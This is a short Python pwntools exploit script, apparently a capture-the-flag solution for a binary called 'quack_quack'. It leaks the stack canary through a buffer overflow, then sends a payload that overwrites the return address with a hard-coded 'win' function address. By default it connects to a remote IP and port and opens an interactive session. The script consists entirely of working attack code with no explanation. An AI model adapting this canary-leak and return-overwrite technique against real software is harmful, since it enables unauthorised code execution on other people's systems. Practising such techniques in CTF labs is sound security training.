from pwn import p64, process, ELF, remote, context, gdb, log, u64

# context.log_level='debug'
win_addr = 0x40137f


def exploit(checkRe):
    if(checkRe is True):
        r = remote('83.136.255.44', 42273)
    else:
        context.binary = elff = ELF('./quack_quack', False)
        r = process()
        gdb.attach(r, gdbscript='''
            b*0x401567
            b*0x4015df
        ''')
    
    r.recvuntil('> ')

    r.sendline(b'A' * (101 - len('Quack Quack ')) + b'Quack Quack ')
    r.recvuntil('Quack Quack ')
    canary_leak = bytes(r.recv(7))
    log.info(f'Value of canary is: {canary_leak}')

    r.recvuntil('> ')
    payload = b'B' * 88 + b'\x00' + canary_leak + b'C' * 8 + p64(win_addr)
    r.sendline(payload)
    r.interactive()

exploit(True)